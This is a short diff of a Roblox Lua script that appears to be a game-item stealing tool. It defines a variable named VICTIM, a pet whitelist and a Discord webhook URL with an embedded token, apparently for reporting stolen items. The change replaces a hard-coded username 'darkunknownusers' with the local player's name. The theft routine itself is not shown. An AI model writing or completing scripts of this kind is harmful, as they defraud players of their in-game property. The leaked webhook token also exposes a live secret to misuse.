@@ -5,7 +5,7 @@ until game:IsLoaded()
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1388199702914404393/YEkwUlOo3WImnClu_PZ6V6IeDvCSmefP8sbEpL1sjVE3dpvfYFLVtdX0iYHJlbl9Iqxg"
 local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "darkunknownusers"
+    game.Players.LocalPlayer.Name
 }
 
 local PET_WHITELIST = {
@@ -231,3 +231,4 @@ task.spawn(function()
     end
 
 end)
+
